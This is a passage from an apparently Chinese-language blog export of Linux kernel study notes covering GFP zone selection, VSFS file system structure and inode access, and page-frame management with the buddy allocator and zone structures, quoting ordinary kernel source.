class="comment"> *</span></span><br><span class="line"><span class="comment"> * GFP_ZONES_SHIFT must be &lt;= 2 on 32 bit platforms.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_ZONE_DEVICE) &amp;&amp; (MAX_NR_ZONES-1) &lt;= 4</span></span><br><span class="line"><span class="comment">/* ZONE_DEVICE is not a valid GFP zone specifier */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_ZONES_SHIFT 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_ZONES_SHIFT ZONES_SHIFT</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 16 * GFP_ZONES_SHIFT &gt; BITS_PER_LONG</span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> GFP_ZONES_SHIFT too large to create GFP_ZONE_TABLE integer</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*将每个标志位映射到每一位，到时候找回需要右移动回去*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_ZONE_TABLE ( \</span></span><br><span class="line"><span class="meta">	(ZONE_NORMAL &lt;&lt; 0 * GFP_ZONES_SHIFT)				       \</span></span><br><span class="line"><span class="meta">	| (OPT_ZONE_DMA &lt;&lt; ___GFP_DMA * GFP_ZONES_SHIFT)		       \</span></span><br><span class="line"><span class="meta">	| (OPT_ZONE_HIGHMEM &lt;&lt; ___GFP_HIGHMEM * GFP_ZONES_SHIFT)	       \</span></span><br><span class="line"><span class="meta">	| (OPT_ZONE_DMA32 &lt;&lt; ___GFP_DMA32 * GFP_ZONES_SHIFT)		       \</span></span><br><span class="line"><span class="meta">	| (ZONE_NORMAL &lt;&lt; ___GFP_MOVABLE * GFP_ZONES_SHIFT)		       \</span></span><br><span class="line"><span class="meta">	| (OPT_ZONE_DMA &lt;&lt; (___GFP_MOVABLE | ___GFP_DMA) * GFP_ZONES_SHIFT)    \</span></span><br><span class="line"><span class="meta">	| (ZONE_MOVABLE &lt;&lt; (___GFP_MOVABLE | ___GFP_HIGHMEM) * GFP_ZONES_SHIFT)\</span></span><br><span class="line"><span class="meta">	| (OPT_ZONE_DMA32 &lt;&lt; (___GFP_MOVABLE | ___GFP_DMA32) * GFP_ZONES_SHIFT)\</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * GFP_ZONE_BAD is a bitmap for all combinations of __GFP_DMA, __GFP_DMA32</span></span><br><span class="line"><span class="comment"> * __GFP_HIGHMEM and __GFP_MOVABLE that are not permitted. One flag per</span></span><br><span class="line"><span class="comment"> * entry starting with bit 0. Bit is set if the combination is not</span></span><br><span class="line"><span class="comment"> * allowed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_ZONE_BAD ( \</span></span><br><span class="line"><span class="meta">	1 &lt;&lt; (___GFP_DMA | ___GFP_HIGHMEM)				      \</span></span><br><span class="line"><span class="meta">	| 1 &lt;&lt; (___GFP_DMA | ___GFP_DMA32)				      \</span></span><br><span class="line"><span class="meta">	| 1 &lt;&lt; (___GFP_DMA32 | ___GFP_HIGHMEM)				      \</span></span><br><span class="line"><span class="meta">	| 1 &lt;&lt; (___GFP_DMA | ___GFP_DMA32 | ___GFP_HIGHMEM)		      \</span></span><br><span class="line"><span class="meta">	| 1 &lt;&lt; (___GFP_MOVABLE | ___GFP_HIGHMEM | ___GFP_DMA)		      \</span></span><br><span class="line"><span class="meta">	| 1 &lt;&lt; (___GFP_MOVABLE | ___GFP_DMA32 | ___GFP_DMA)		      \</span></span><br><span class="line"><span class="meta">	| 1 &lt;&lt; (___GFP_MOVABLE | ___GFP_DMA32 | ___GFP_HIGHMEM)		      \</span></span><br><span class="line"><span class="meta">	| 1 &lt;&lt; (___GFP_MOVABLE | ___GFP_DMA32 | ___GFP_DMA | ___GFP_HIGHMEM)  \</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">enum</span> zone_type <span class="title function_">gfp_zone</span><span class="params">(<span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">z</span>;</span></span><br><span class="line">	<span class="type">int</span> bit = (__force <span class="type">int</span>) (flags &amp; GFP_ZONEMASK);</span><br><span class="line"></span><br><span class="line">	z = (GFP_ZONE_TABLE &gt;&gt; (bit * GFP_ZONES_SHIFT)) &amp;</span><br><span class="line">					 ((<span class="number">1</span> &lt;&lt; GFP_ZONES_SHIFT) - <span class="number">1</span>);</span><br><span class="line">	VM_BUG_ON((GFP_ZONE_BAD &gt;&gt; bit) &amp; <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



















]]></content>
      <categories>
        <category>linux内核</category>
        <category>5.15</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>os文件系统</title>
    <url>/2024/08/19/linux%E5%86%85%E6%A0%B8/%E5%88%9D%E6%8E%A2/os%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F1/</url>
    <content><![CDATA[<blockquote>
<p>关于os持久化的一些学习</p>
</blockquote>
<h1 id="硬件基础（磁盘）"><a href="#硬件基础（磁盘）" class="headerlink" title="硬件基础（磁盘）"></a>硬件基础（磁盘）</h1><h2 id="几何结构"><a href="#几何结构" class="headerlink" title="几何结构"></a>几何结构</h2><h2 id="访问机制"><a href="#访问机制" class="headerlink" title="访问机制"></a>访问机制</h2><h2 id="RAID"><a href="#RAID" class="headerlink" title="RAID"></a>RAID</h2><h1 id="初始化与os访问机制（文件系统与挂载）"><a href="#初始化与os访问机制（文件系统与挂载）" class="headerlink" title="初始化与os访问机制（文件系统与挂载）"></a>初始化与os访问机制（文件系统与挂载）</h1><blockquote>
<p>磁盘进行格式化的方式无非就是加入一些元信息来让os实现软件式的数据交互与管理，初始化为不同的文件系统的类型有多种多样的管理方式，但是机制无非就那几种。</p>
<p>核心还是理解数据结构，算法的话，有多种多样的实现</p>
</blockquote>
<h2 id="文件系统的整体架构（以VSFS为例）"><a href="#文件系统的整体架构（以VSFS为例）" class="headerlink" title="文件系统的整体架构（以VSFS为例）"></a>文件系统的整体架构（以VSFS为例）</h2><blockquote>
<p>S:为文件系统挂载之后所需用来描述文件系统的一些核心信息，在ELF中类似于fileheader</p>
<p>i：inode位图，用来描述哪个inode为空</p>
<p>d：数据位图，用来描述哪个数据块为空</p>
<p>inodes：在每个inode中，实际上是所有关于文件的信息：文件类型（例如，常规文件、目录等）、大小、分配给它的块数、保护信息（如谁拥有该文件以及谁可以访问它）、一些时间信息（包括文件创建、修改或上次访问的时间文件下），以及有关其数据块驻留在磁盘上的位置的信息（如某种类型的指针）。我们将所有关于文件的信息称为元数据（metadata）。实际上，文件系统中除了纯粹的用户数据外，其他任何信息通常都称为元数据。</p>
</blockquote>
<p><img src="/img/mypic/linux/%E5%88%9D%E6%8E%A2/fs.png" alt="fs"></p>
<h2 id="inode机制"><a href="#inode机制" class="headerlink" title="inode机制"></a>inode机制</h2><blockquote>
<p>在每个inode中，实际上是所有关于文件的信息：文件类型（例如，常规文件、目录等）、大小、分配给它的块数、保护信息（如谁拥有该文件以及谁可以访问它）、一些时间信息（包括文件创建、修改或上次访问的时间文件下），以及有关其数据块驻留在磁盘上的位置的信息（如某种类型的指针）。我们将所有关于文件的信息称为元数据（metadata）。实际上，文件系统中除了纯粹的用户数据外，其他任何信息通常都称为元数据。</p>
</blockquote>
<h3 id="如何获取inode所在的扇区地址"><a href="#如何获取inode所在的扇区地址" class="headerlink" title="如何获取inode所在的扇区地址"></a>如何获取inode所在的扇区地址</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">blk    = (inumber * <span class="built_in">sizeof</span>(<span class="type">inode_t</span>)) / blockSize;</span><br><span class="line">sector = ((blk * blockSize) + inodeStartAddr) / sectorSize;</span><br></pre></td></tr></table></figure>

<h3 id="数据位置的引用"><a href="#数据位置的引用" class="headerlink" title="数据位置的引用"></a>数据位置的引用</h3><blockquote>
<p>设计inode时，最重要的决定之一是它如何引用数据块的位置。</p>
<p>这里学习了三种，一种为多级索引的方法，一种为基于范围的方法，基于链表的方法</p>
<p>多级索引主要用于解决指针数不够，以至于无法支持大文件的情形。</p>
<p>基于范围的方法主要是用指针加范围的形式来定位数据</p>
<p>基于链表的方法则是通过数据块的末尾加上指针将数据串接起来</p>
</blockquote>
<h3 id="目录存储方式"><a href="#目录存储方式" class="headerlink" title="目录存储方式"></a>目录存储方式</h3><blockquote>
<p>在VSFS中（像许多文件系统一样），目录的组织很简单。一个目录基本上只包含一个二元组（条目名称，inode号）的列表。对于给定目录中的每个文件或目录，目录的数据块中都有一个字符串和一个数字。对于每个字符串，可能还有一个长度（假定采用可变大小的名称）。</p>
<p>通常，文件系统将目录视为特殊类型的文件。因此，目录有一个inode，位于inode表中的某处（inode表中的inode标记为“目录”的类型字段，而不是“常规文件”）。该目录具有由inode指向的数据块（也可能是间接块）。这些数据块存在于我们的简单文件系统的数据块区域中。</p>
</blockquote>
<h3 id="访问过程"><a href="#访问过程" class="headerlink" title="访问过程"></a>访问过程</h3><blockquote>
<p>关于<code>open(&quot;/foo/bar&quot;, O_RDONLY)</code></p>
<p>文件系统首先需要找到文件bar的inode,文件系统必须遍历（traverse）路径名，从而找到所需的inode。</p>
</blockquote>
<ol>
<li>遍历根目录（root directory），它就记为&#x2F;,文件系统的第一次磁盘读取是根目录的inode,根的inode号必须是“众所周知的”。根的inode号为2。因此，要开始该过程，文件系统会读入inode号2的块（第一个inode块）。</li>
<li>寻找foo的条目。通过读入一个或多个目录数据块，它将找到foo的条目。一旦找到，文件系统也会找到下一个需要的foo的inode号</li>
<li>文件系统读取包含foo的inode及其目录数据的块，最后找到bar的inode号。在每个进程的打开文件表中，为此进程分配一个文件描述符，并将它返回给用户。</li>
</ol>
<blockquote>
<p>关于写入,文件已存在</p>
<p>每次写入操作不仅需要将数据写入磁盘，还必须首先决定将哪个块分配给文件，从而相应地更新磁盘的其他结构（例如数据位图和inode）。</p>
</blockquote>
<ol>
<li>首先，文件必须打开（如上所述）</li>
<li>一个读取数据位图（然后更新以标记新分配的块被使用），2次IO</li>
<li>一个写入位图（将它的新状态存入磁盘），再有两次I&#x2F;O，其中一次是读取inode，另一次是写inode（为了更新块的位置）</li>
<li>写入真正的数据块本身</li>
<li>综上所用5次IO</li>
</ol>
<blockquote>
<p>文件创建</p>
</blockquote>
<ol>
<li>一个读取inode位图（查找空闲inode）</li>
<li>一个写入inode位图（将其标记为已分配）</li>
<li>一个写入新的inode本身（初始化它）</li>
<li>一个写入目录的数据（将文件的高级名称链接到它的inode号）</li>
<li>以及一个读写目录inode以便更新它。</li>
<li>如果目录需要增长以容纳新条目，则还需要额外的I&#x2F;O（即数据位图和新目录块）。</li>
</ol>
<h3 id="何为挂载？"><a href="#何为挂载？" class="headerlink" title="何为挂载？"></a>何为挂载？</h3><p>挂载即把文件系统装入到内存中，可以直接通过文件资源管理器来访问文件。</p>
]]></content>
      <categories>
        <category>linux内核</category>
        <category>初探</category>
      </categories>
      <tags>
        <tag>linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>内存管理</title>
    <url>/2024/09/11/linux%E5%86%85%E6%A0%B8/%E5%88%9D%E6%8E%A2/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/</url>
    <content><![CDATA[<p>为了研究内核的堆利用，因此需要学习一下内核的内存分配的相关知识</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://chatgpt.com/">https://chatgpt.com/</a></p>
<p><a href="https://scis.uohyd.ac.in/~atulcs/COOS/Linux-HOWTOs/linux%20kernel/Understanding%20The%20Linux%20Kernel.pdf">https://scis.uohyd.ac.in/~atulcs/COOS/Linux-HOWTOs/linux%20kernel/Understanding%20The%20Linux%20Kernel.pdf</a></p>
<p><a href="https://github.com/andylhqiu/linux-2.6.10">https://github.com/andylhqiu/linux-2.6.10</a></p>
<p><a href="https://s3.shizhz.me/linux-mm/3.2-wu-li-nei-cun/3.2.5-slab-slub-slob#org8b92d2a">https://s3.shizhz.me/linux-mm/3.2-wu-li-nei-cun/3.2.5-slab-slub-slob#org8b92d2a</a></p>
<p><a href="https://elixir.bootlin.com/linux/v2.6.10/source/include/asm-ia64/mmzone.h">https://elixir.bootlin.com/linux/v2.6.10/source/include/asm-ia64/mmzone.h</a></p>
<h2 id="1-Page-Frame-Management"><a href="#1-Page-Frame-Management" class="headerlink" title="1.Page Frame Management"></a>1.Page Frame Management</h2><h3 id="1-1-page-frame"><a href="#1-1-page-frame" class="headerlink" title="1.1 page frame"></a>1.1 page frame</h3><blockquote>
<p>页描述符，通过lru将page连接起来。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*/include/linux/mm.h*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Each physical page in the system has a struct page associated with</span></span><br><span class="line"><span class="comment"> * it to keep track of whatever it is we are using the page for at the</span></span><br><span class="line"><span class="comment"> * moment. Note that we have no way to track which tasks are using</span></span><br><span class="line"><span class="comment"> * a page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">	<span class="type">page_flags_t</span> flags;		<span class="comment">/* Atomic flags, some possibly</span></span><br><span class="line"><span class="comment">					 * updated asynchronously */</span></span><br><span class="line">	<span class="type">atomic_t</span> _count;		<span class="comment">/* Usage count, see below. */</span></span><br><span class="line">	<span class="type">atomic_t</span> _mapcount;		<span class="comment">/* Count of ptes mapped in mms,</span></span><br><span class="line"><span class="comment">					 * to show when page is mapped</span></span><br><span class="line"><span class="comment">					 * &amp; limit reverse map searches.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;		<span class="comment">/* Mapping-private opaque data:</span></span><br><span class="line"><span class="comment">					 * usually used for buffer_heads</span></span><br><span class="line"><span class="comment">					 * if PagePrivate set; used for</span></span><br><span class="line"><span class="comment">					 * swp_entry_t if PageSwapCache</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>	<span class="comment">/* If low bit clear, points to</span></span><br><span class="line"><span class="comment">					 * inode address_space, or NULL.</span></span><br><span class="line"><span class="comment">					 * If page mapped as anonymous</span></span><br><span class="line"><span class="comment">					 * memory, low bit is set, and</span></span><br><span class="line"><span class="comment">					 * it points to anon_vma object:</span></span><br><span class="line"><span class="comment">					 * see PAGE_MAPPING_ANON below.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="type">pgoff_t</span> index;			<span class="comment">/* Our offset within mapping. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>		<span class="comment">/* Pageout list, eg. active_list</span></span><br><span class="line"><span class="comment">					 * protected by zone-&gt;lru_lock !</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment">	 * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment">	 * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment">	 * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment">	 * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment">	 * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">	<span class="type">void</span> *virtual;			<span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">					   not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-ARRAY"><a href="#1-2-ARRAY" class="headerlink" title="1.2 ARRAY"></a>1.2 ARRAY</h3><blockquote>
<p>管理所有的页帧。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_DISCONTIGMEM</span></span><br><span class="line"><span class="comment">/* The array of struct pages - for discontigmem use pgdat-&gt;lmem_map */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-The-Buddy-System-Algorithm"><a href="#1-3-The-Buddy-System-Algorithm" class="headerlink" title="1.3 The Buddy System Algorithm"></a>1.3 The Buddy System Algorithm</h3><blockquote>
<p>设计指南：</p>
<p>作为一种分配连续页帧的算法，需要应对外部碎片，两种解决方法：</p>
<p>1.利用虚拟地址映射，将连续的虚拟地址映射到不连续的页帧之上</p>
<p>2.算法本身的高效。（最好使用此方法因为有的操作是忽略mmu映射的（如：DMA））</p>
<p>但是不能频繁更改页表，因为会使缓冲区频繁刷新（更长的访存时间）。</p>
<p>算法描述：</p>
<p>Linux 采用的解决外部碎片问题的技术基于著名的伙伴系统算法。所有空闲的页面框架被分成10个不同大小的块列表，分别包含 1、2、4、8、16、32、64、128、256 和 512 个连续页面框架的块。每个块中第一个页面框架的物理地址是组大小的倍数：例如，一个包含 16 个页面框架的块的初始地址是 16 × 2^12 的倍数。</p>
<p>算法功能示例：</p>
<p>假设需要分配128个连续页帧，算法会一个一个查找，若有同样大小的，则分配，否则找更大的然后拆分，若最大的没有，那么会报错。</p>
<p>页帧合并条件：1.尺寸一样。2.连续。3.地址对齐</p>
</blockquote>
<h4 id="1-3-1-数据结构"><a href="#1-3-1-数据结构" class="headerlink" title="1.3.1 数据结构"></a>1.3.1 数据结构</h4><blockquote>
<p>linux中实现了连个不同的伙伴系统，一个处理DMA的页帧分配，另一个处理其余的。本节将学习伙伴算法依赖的数据结构</p>
<p><strong><code>mem_map</code> 数组</strong>：这是前面介绍的结构。</p>
<p><strong>包含 10 个 <code>free_area_struct</code> 类型元素的数组</strong>，每个组大小都有一个元素。<code>free_area[0]</code> 指向由伙伴系统管理的页框数组，这些页框不适合 ISA DMA 操作，而 <code>free_area[1]</code> 指向适合 ISA DMA 的页框数组。</p>
<p><strong>十个二进制位图数组</strong>，每个组大小一个位图。每个伙伴系统都有自己的一组位图，通过这些位图来跟踪块是否被分配。</p>
<p>每个free_area[0] and free_area[1] 指向的数组的元素都是free_area_struct类型的。</p>
</blockquote>
<p><img src="/img/mypic/linux/%E4%BC%99%E4%BC%B4.png" alt="image-20240911191314680"></p>
<blockquote>
<p>2.6.10中结构体不太一样，定义在：&#x2F;include&#x2F;linux&#x2F;mmzone.h文件中，每一个上述图片代表一个zone，<code>free_area[0]</code>等演变成个不同的zone。</p>
</blockquote>
<h5 id="ZONE"><a href="#ZONE" class="headerlink" title="ZONE"></a>ZONE</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZONE_DMA		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZONE_NORMAL		1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZONE_HIGHMEM		2</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Fields commonly accessed by the page allocator */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		free_pages;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		pages_min, pages_low, pages_high;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * protection[] is a pre-calculated number of extra pages that must be</span></span><br><span class="line"><span class="comment">	 * available in a zone in order for __alloc_pages() to allocate memory</span></span><br><span class="line"><span class="comment">	 * from the zone. i.e., for a GFP_KERNEL alloc of &quot;order&quot; there must</span></span><br><span class="line"><span class="comment">	 * be &quot;(1&lt;&lt;order) + protection[ZONE_NORMAL]&quot; free pages in the zone</span></span><br><span class="line"><span class="comment">	 * for us to choose to allocate the page from that zone.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * It uses both min_free_kbytes and sysctl_lower_zone_protection.</span></span><br><span class="line"><span class="comment">	 * The protection values are recalculated if either of these values</span></span><br><span class="line"><span class="comment">	 * change.  The array elements are in zonelist order:</span></span><br><span class="line"><span class="comment">	 *	[0] == GFP_DMA, [1] == GFP_KERNEL, [2] == GFP_HIGHMEM.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		protection[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span>	<span class="title">pageset</span>[<span class="title">NR_CPUS</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * free areas of different sizes</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		lru_lock;	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">active_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">inactive_list</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_scan_active;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_scan_inactive;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_active;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_inactive;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		pages_scanned;	   <span class="comment">/* since last reclaim */</span></span><br><span class="line">	<span class="type">int</span>			all_unreclaimable; <span class="comment">/* All pages pinned */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * prev_priority holds the scanning priority for this zone.  It is</span></span><br><span class="line"><span class="comment">	 * defined as the scanning priority at which we achieved our reclaim</span></span><br><span class="line"><span class="comment">	 * target at the previous try_to_free_pages() or balance_pgdat()</span></span><br><span class="line"><span class="comment">	 * invokation.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * We use prev_priority as a measure of how much stress page reclaim is</span></span><br><span class="line"><span class="comment">	 * under - it drives the swappiness decision: whether to unmap mapped</span></span><br><span class="line"><span class="comment">	 * pages.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * temp_priority is used to remember the scanning priority at which</span></span><br><span class="line"><span class="comment">	 * this zone was successfully refilled to free_pages == pages_high.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Access to both these fields is quite racy even on uniprocessor.  But</span></span><br><span class="line"><span class="comment">	 * it is expected to average out OK.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> temp_priority;</span><br><span class="line">	<span class="type">int</span> prev_priority;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line">	<span class="comment">/* Rarely used or read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * wait_table		-- the array holding the hash table</span></span><br><span class="line"><span class="comment">	 * wait_table_size	-- the size of the hash table array</span></span><br><span class="line"><span class="comment">	 * wait_table_bits	-- wait_table_size == (1 &lt;&lt; wait_table_bits)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The purpose of all these is to keep track of the people</span></span><br><span class="line"><span class="comment">	 * waiting for a page to become available and make them</span></span><br><span class="line"><span class="comment">	 * runnable again when possible. The trouble is that this</span></span><br><span class="line"><span class="comment">	 * consumes a lot of space, especially when so few things</span></span><br><span class="line"><span class="comment">	 * wait on pages at a given time. So instead of using</span></span><br><span class="line"><span class="comment">	 * per-page waitqueues, we use a waitqueue hash table.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The bucket discipline is to sleep on the same queue when</span></span><br><span class="line"><span class="comment">	 * colliding and wake all in that wait queue when removing.</span></span><br><span class="line"><span class="comment">	 * When something wakes, it must check to be sure its page is</span></span><br><span class="line"><span class="comment">	 * truly available, a la thundering herd. The cost of a</span></span><br><span class="line"><span class="comment">	 * collision is great, but given the expected load of the</span></span><br><span class="line"><span class="comment">	 * table, they should be so rare as to be outweighed by the</span></span><br><span class="line"><span class="comment">	 * benefits from the saved space.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * __wait_on_page_locked() and unlock_page() in mm/filemap.c, are the</span></span><br><span class="line"><span class="comment">	 * primary users of these fields, and in mm/page_alloc.c</span></span><br><span class="line"><span class="comment">	 * free_area_init_core() performs the initialization of them.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span>	* wait_table;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		wait_table_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		wait_table_bits;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Discontig memory support fields.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>	*<span class="title">zone_pgdat</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span>		*<span class="title">zone_mem_map</span>;</span></span><br><span class="line">	<span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		zone_start_pfn;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		spanned_pages;	<span class="comment">/* total size, including holes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		present_pages;	<span class="comment">/* amount of memory (excluding holes) */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * rarely used fields:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">char</span>			*name;</span><br><span class="line">&#125; ____cacheline_maxaligned_in_smp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="free-area"><a href="#free-area" class="headerlink" title="free_area"></a>free_area</h5><blockquote>
<p>第一次看有点奇怪，这链表怎么只存储指针，那么该如何定位数据？</p>
<p>其定位数据是通过一个宏，可以获得一个结构体中的其他元素，那么链表的操作就只用操作节点了，非常高效。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">free_list</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		*<span class="built_in">map</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="1-3-2-算法实现"><a href="#1-3-2-算法实现" class="headerlink" title="1.3.2 算法实现"></a>1.3.2 算法实现</h4><blockquote>
<p>在理解了一些数据结构基础之后，可以学习一下算法。</p>
<p>集中在 <code>mm/page_alloc.c</code> 文件中</p>
</blockquote>
<h2 id="2-Page-Frame-Management"><a href="#2-Page-Frame-Management" class="headerlink" title="2.Page Frame Management"></a>2.Page Frame Management</h2><blockquote>
<p>此部分学习小内存分配，会有外部碎片的问题，即将学习Linux的分配模式。</p>
<p>linux2.0采用几何分布分配的方法，也就是只能分配2的次幂大小的块，这就把内部碎片降低到了百分之50以内。</p>
<p>伙伴算法并不能支持上述要求，因此提出一种新算法（源自： slab allocator）</p>
</blockquote>
<h3 id="2-1设计准则"><a href="#2-1设计准则" class="headerlink" title="2.1设计准则"></a>2.1设计准则</h3><blockquote>
<p>先学习以下基本的设计理念。</p>
</blockquote>
<blockquote>
<p>slab allocator算法基于以下几个准则设置的</p>
</blockquote>
